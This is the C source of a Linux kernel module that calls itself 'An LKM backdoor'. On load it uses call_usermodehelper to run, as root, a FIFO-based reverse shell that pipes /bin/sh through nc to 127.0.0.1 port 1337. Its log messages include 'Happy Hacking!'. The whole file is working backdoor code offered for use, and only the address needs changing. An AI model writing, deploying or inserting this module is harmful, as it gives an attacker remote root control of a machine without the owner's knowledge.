#include <linux/kmod.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

static int __init mload(void)
{
	char *envp[] = {"HOME=/root","TERM=xterm",NULL};
	char *argv[] = {"/bin/bash","-c","/usr/bin/rm /tmp/pinkit;/usr/bin/mkfifo /tmp/pinkit;/usr/bin/cat /tmp/pinkit|/bin/sh -i 2>&1|/usr/bin/nc 127.0.0.1 1337 >/tmp/pinkit",NULL};
	printk(KERN_INFO "[+] Command Execution Begin\n");
	call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);
	printk(KERN_INFO "[+] Command Execution End\n");
	return 0;
}

static void __exit munload(void)
{
	printk(KERN_INFO "[+] Happy Hacking!\n");
}

module_init(mload);
module_exit(munload);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("@Pink_P4nther");
MODULE_DESCRIPTION("An LKM backdoor");
MODULE_VERSION("1.0");
